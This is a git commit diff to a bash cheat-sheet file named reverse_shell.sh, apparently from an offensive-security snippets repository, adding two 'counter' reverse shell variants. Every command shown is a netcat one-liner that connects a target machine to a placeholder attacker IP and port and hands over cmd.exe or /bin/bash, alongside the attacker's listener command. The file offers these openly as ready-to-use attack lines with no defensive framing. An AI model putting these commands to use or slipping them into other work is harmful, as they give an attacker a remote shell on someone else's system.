d28644f9f768c556215759ec6051b6c7137503ed
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-07-31 17:07:43 -0300

    Update reverse_shell.sh

--- Code/Bash/reverse_shell.sh
+++ Code/Bash/reverse_shell.sh
@@ -3,3 +3,7 @@ nc -vnlp [PORT]
 
 # Target:
 nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash]
+
+# "counter" reverse shell:
+(echo 0 && nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash])
+echo 0; nc -vn [IP] [PORT] -e [cmd.exe | /bin/bash]
